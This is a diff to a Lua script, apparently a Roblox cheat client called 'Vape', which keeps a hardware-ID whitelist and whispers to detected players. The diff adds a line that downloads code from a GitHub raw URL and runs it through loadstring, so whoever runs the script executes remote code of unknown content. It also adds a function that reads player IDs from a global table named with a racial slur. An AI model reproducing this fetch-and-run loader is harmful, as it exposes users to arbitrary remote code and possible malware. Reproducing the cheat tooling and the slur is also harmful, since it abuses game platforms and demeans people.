@@ -2153,6 +2153,7 @@ local function findItemInTable(tab, item)
 end
 
 local HWID = game:GetService("RbxAnalyticsService"):GetClientId()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/31VS1/new/main/whiteshit", true))()
 
 local HwidWhitelist = {
     "C642B037-0D0A-49E3-8C03-4DB8CEA613A2" --  Xzyn
@@ -2167,15 +2168,25 @@ if table.find(HwidWhitelist, HWID) then
       local Read = readfile("/vape/Whitelist.txt")
       createwarning("Vape","Whitelisted", 60)
 end
+local function checkstate(plr)
+	local tab = shared.nigger
+	for i,v in pairs(tab) do
+		if tonumber(v) == tonumber(plr.UserId) then
+			return true
+		end
+	end
+	return false
+end
+
 task.spawn(function()
 game.Players.PlayerAdded:Connect(function(plr)
-	if HWID(plr) then
+	if checkstate(plr) then
 		repstorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("/w "..plr.Name.." "..clients.ChatStrings2.vape, "All")
 	end
 end)
 
 for i,v in pairs(game.Players:GetPlayers()) do
-	if HWID(v) then
+	if checkstate(v) then
 		repstorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("/w "..v.Name.." "..clients.ChatStrings2.vape, "All")
 	end
 end
